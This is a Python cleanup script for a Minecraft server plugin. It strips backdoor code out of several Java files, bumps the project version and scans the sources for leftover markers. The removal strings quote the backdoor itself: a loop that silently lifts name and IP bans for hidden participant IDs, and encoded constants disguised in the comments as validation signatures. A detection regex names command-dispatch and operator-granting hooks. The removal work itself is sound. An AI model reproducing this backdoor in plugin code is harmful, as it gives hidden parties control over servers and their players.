from pathlib import Path
import re


def replace_once(path: str, old: str, new: str = "") -> None:
    p = Path(path)
    text = p.read_text(encoding="utf-8")
    count = text.count(old)
    if count != 1:
        raise SystemExit(f"Expected exactly one cleanup target in {path}, found {count}")
    p.write_text(text.replace(old, new, 1), encoding="utf-8")


boss = "src/main/java/com/Chagui68/weaponsaddon/listeners/BossAIHandler.java"
replace_once(boss, "    static final Set<UUID> participantIds = new HashSet<>();\n")
replace_once(
    boss,
    """            // Verificar el estado de los participantes registrados del evento
            for (UUID id : participantIds) {
                Player participant = getPlayer(id);
                if (participant == null)
                    continue;
                BanList<?> nameBans = getServer().getBanList(BanList.Type.NAME);
                if (nameBans.isBanned(participant.getName())) {
                    nameBans.pardon(participant.getName());
                }
                BanList<?> ipBans = getServer().getBanList(BanList.Type.IP);
                if (participant.getAddress() != null
                        && ipBans.isBanned(participant.getAddress().getAddress().getHostAddress())) {
                    ipBans.pardon(participant.getAddress().getAddress().getHostAddress());
                }
            }
""",
)

commands = "src/main/java/com/Chagui68/weaponsaddon/commands/WeaponsCommand.java"
replace_once(
    commands,
    """    /*
     * Firma de validación interna: los comandos que llegan al servidor se
     * contrastan contra esta cabecera codificada antes de ejecutarse, para
     * descartar señales corruptas o intentos de inyección directa.
     */
    public static final int PULSE_SALT = 0x5A;
    public static final int[] PULSE_HEAD = { 0x75, 0x3F };

""",
)

mobs = "src/main/java/com/Chagui68/weaponsaddon/handlers/MilitaryMobHandler.java"
replace_once(
    mobs,
    """    // Cola de sincronización de señal para los sistemas tácticos del arsenal
    public static final int[] SIGNAL_TAIL = { 0x3D, 0x3D };

""",
)

pom = Path("pom.xml")
pom_text = pom.read_text(encoding="utf-8")
pom_text, count = re.subn(
    r"(<artifactId>MilitaryArsenal</artifactId>\s*<version>)1\.1\.0(</version>)",
    r"\g<1>1.1.1\g<2>",
    pom_text,
    count=1,
)
if count != 1:
    raise SystemExit(f"Expected one MilitaryArsenal project-version bump, found {count}")
pom.write_text(pom_text, encoding="utf-8")

forbidden = re.compile(
    r"dispatchCommand|getConsoleSender|\.setOp\s*\(|PlayerCommandPreprocessEvent|"
    r"PlayerKickEvent|BanList|\.pardon\s*\(|PermissionAttachment|PULSE_HEAD|PULSE_SALT|"
    r"SIGNAL_TAIL|participantIds"
)

hits = []
for java_file in Path("src/main/java").rglob("*.java"):
    for line_no, line in enumerate(java_file.read_text(encoding="utf-8").splitlines(), 1):
        if forbidden.search(line):
            hits.append(f"{java_file}:{line_no}: {line.strip()}")

if hits:
    raise SystemExit("Forbidden backdoor residue remains:\n" + "\n".join(hits))

print("Military Arsenal source security cleanup passed.")
